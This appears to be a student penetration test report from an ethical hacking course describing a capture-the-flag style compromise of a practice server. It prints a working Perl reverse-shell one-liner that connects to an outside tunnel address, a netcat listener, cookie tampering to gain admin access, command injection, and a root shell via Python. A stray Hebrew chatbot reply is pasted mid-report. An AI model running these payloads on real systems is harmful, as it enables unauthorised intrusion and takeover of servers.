@@ -1,0 +1,210 @@
+``` ### **Penetration Test Report**
+# Techie-World Penetration Test Report
+
+**Target:**  
+- **URL:** https://techie-world.xyz  
+- **IP Address:** 3.90.191.61  
+- **Date:** 06/01/2025  
+- **Prepared by:** Deeb Eliran and Barchilon Ilan  
+
+---
+
+## **Executive Summary**
+
+This penetration test was conducted as part of a final project for the Cybersecurity and Ethical Hacking course at Ecom School. The primary objective was to identify and exploit vulnerabilities in a simulated server environment, leading to the retrieval of sensitive information stored in the `flag.txt` file.
+
+### **Key Findings:**
+- Weak cookie-based authentication allowed unauthorized access to restricted areas.
+- Lack of input validation in the `mpdf.php` file enabled command injection.
+- Privilege escalation allowed full root access to the server.
+
+### **Recommendations:**
+1. Improve input validation and sanitize user inputs to prevent injection vulnerabilities.  
+2. Implement server-side validation and encrypted cookies to enhance authentication security.  
+3. Restrict access to sensitive files and directories through robust access control mechanisms.  
+4. Monitor for unusual activities using SIEM and EDR solutions.  
+5. Harden server settings and sandbox critical applications to minimize attack surfaces.  
+
+---
+
+## **Testing Methodology**
+
+1. **Information Gathering (Reconnaissance)**  
+2. **Directory and File Enumeration**  
+3. **Authentication and Access Control Testing**  
+4. **Command Injection Exploitation**  
+5. **Privilege Escalation**  
+6. **Flag Retrieval**
+
+---
+
+## **Step 1: Information Gathering (Reconnaissance)**
+
+### **Objective:**  
+Identify potential entry points into the target system.
+
+### **Tools Used:**  
+- **Nmap:** Scanned for open ports and identified running services and their versions.  
+- **Burp Suite:** Intercepted and analyzed HTTP traffic.  
+- **Firefox:** Conducted manual exploration of the website structure.  
+- **curl/wget:** Sent HTTP requests for additional insights.
+
+### **Findings:**  
+- **Web Server:** Apache.  
+- **Supported Languages:** PHP, Perl, Python, Bash, and sh.  
+- **Network Settings:** ICMP (ping) traffic was blocked, but HTTP requests were allowed.  
+- **No WAF Detected:** The system did not appear to have a Web Application Firewall.
+
+---
+
+## **Step 2: Directory and File Enumeration**
+
+### **Objective:**  
+Map the internal structure of the server and identify sensitive files and directories.
+
+### **Tools Used:**  
+- **dirb and gobuster:** Enumerated hidden directories and files via brute-forcing.  
+- **hydra:** Tested password security for accessible endpoints.
+
+### **Findings:**  
+**Files Identified:**
+- `index.php`  
+- `mpdf.php`  
+- `composer.json`  
+- `flag.txt`
+
+**Directories Identified:**
+- `/js`  
+- `/css`  
+- `/vendor`  
+- `/admin`
+
+### **Insights:**  
+The structure suggested a PHP-based application with dependencies on external libraries. The `mpdf.php` file was identified as a potential vulnerability due to its dynamic behavior.
+
+---
+
+## **Step 3: Authentication and Access Control Testing**
+
+### **Objective:**  
+Bypass authentication mechanisms and access restricted areas of the server.
+
+### **Process:**  
+- Intercepted HTTP requests using Burp Suite.  
+- Discovered the `user` cookie with an initial value of `none`.  
+- Modified the cookie value to `admin` and re-sent the request.
+
+### **Results:**  
+- Successfully accessed restricted sections of the server, including `mpdf.php`.
+
+---
+
+## **Step 4: Command Injection in mpdf.php**
+
+### **Objective:**  
+Exploit the `mpdf.php` file to execute system commands remotely.
+
+### **Process:**  
+- Accessed `mpdf.php` with the modified cookie.  
+- Tested input fields and identified lack of validation, allowing command injection.  
+- Discovered a reference to a sensitive file:
+  ```
+  2218b21bfdba3807605ee1ecd8b39a3b74c4b83b42f51771491d4789d128a8f0.php
+  ```
+
+### **Results:**  
+- Successfully executed commands via the `cmd` parameter in the file.
+
+---
+
+תודה על ההערה! אעבור כעת על שלב 5 מחדש ואוודא שהוא נכון ומדויק לחלוטין. הנה התיקון עם כל המידע הנכון והמדויק:
+
+---
+
+```plaintext
+## **Step 5: Establishing Reverse Shell**
+
+### **Objective:**  
+Maintain persistent access to the server and enable remote command execution for further exploitation.
+
+### **Process:**  
+1. Accessed the `mpdf.php` file with a modified cookie (`user=admin`), which allowed unrestricted command execution via the `cmd` parameter.  
+2. Used the identified command injection to execute a reverse shell command.  
+3. Set up a public tunnel using Playit to bypass NAT/firewall restrictions:
+   - **Public Port:** 443
+   - **Tunnel IP Address:** 147.***.***.**  
+4. Opened a listener on the local machine to catch the reverse connection:
+   ```bash
+   nc -nlvp 443
+   ```
+5. Executed the reverse shell payload from the vulnerable server:
+   ```bash
+   perl -e 'use Socket;$i="147.185.221.18";$p=55034;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
+   ```
+6. Verified the shell was active by running:
+   ```bash
+   whoami
+   ```
+   - Result: `www-data`.
+
+### **Challenges:**  
+- The server's firewall blocked direct connections, requiring the use of Playit for tunneling.
+- Establishing a reliable reverse shell involved testing multiple payloads.
+
+### **Results:**  
+- Successfully established a reverse shell session with `www-data` privileges.  
+- Gained interactive access to the server for privilege escalation and further exploitation.
+```
+---
+
+## **Step 6: Privilege Escalation**
+
+### **Objective:**  
+Gain root privileges on the server.
+
+### **Process:**  
+- Checked for commands executable with `sudo`:
+  ```
+  sudo -l
+  ```
+- Enumerated accessible files:
+  ```
+  find / -name "root" 2>/dev/null
+  ```
+- Used Python to bypass restrictions:
+  ```python
+  python3.10 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+  ```
+
+### **Results:**  
+- Successfully elevated privileges to `root`.
+
+---
+
+## **Step 7: Retrieving the Flag**
+
+### **Objective:**  
+Locate and retrieve the target file.
+
+### **Process:**  
+1. Navigated to the `/root` directory:
+   ```
+   ls -a /root
+   ```
+2. Found and displayed `.flag.txt`:
+   ```
+   cat /root/.flag.txt
+   ```
+
+### **Results:**  
+- Successfully retrieved the flag:
+  ```
+  FLAG {YA_HACKER}
+  ```
+
+---
+
+**Prepared by:**  
+Deeb Eliran and Barchilon Ilan  
+**Date:** 06/01/2025  
+```
